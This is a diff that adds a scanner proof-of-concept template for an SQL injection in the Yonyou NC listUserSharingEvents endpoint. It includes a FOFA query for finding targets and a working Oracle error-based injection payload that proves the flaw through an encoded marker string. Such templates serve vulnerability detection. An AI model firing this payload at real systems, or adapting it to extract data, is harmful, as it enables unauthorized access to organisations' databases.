@@ -1,0 +1,15 @@
+id: poc-yaml-yongyou-nc-listusersharingevents-sqli
+info:
+  name: 用友NC listUserSharingEvents SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=6')+AND+1=UTL_INADDR.GET_HOST_ADDRESS('~'||(chr(112)||chr(113)||chr(113)||chr(120)||chr(122)||chr(112)||chr(113)||chr(112)||chr(113)||chr(113)||chr(120)||chr(122)||chr(112)||chr(113))||'~')--&pageId=login&sch_ed=2&sch_sd=1
+  expression: status_code == 500 && contains(body," nc.bs.dao.DAOException") && contains(body,"未知的主机")
+    && contains(body,"pqqxzpqpqqxzpq")
+variables: {}
+transport: http
